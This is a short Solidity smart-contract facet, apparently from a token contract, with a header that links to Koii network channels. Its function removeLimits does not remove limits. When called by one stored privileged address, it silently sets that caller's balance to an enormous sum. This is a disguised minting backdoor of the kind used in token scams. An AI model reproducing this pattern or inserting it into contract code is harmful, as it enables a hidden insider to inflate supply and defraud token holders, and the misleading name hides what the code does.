/*  
   * SPDX-License-Identifier: MIT 

    //Telegram: https://t.me/koiinetwork
    // Twitter: https://twitter.com/KoiiFoundation
    // Website: https://www.koii.network/
    // Discord: https://discord.com/invite/koii-network
    
    
   

*/
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
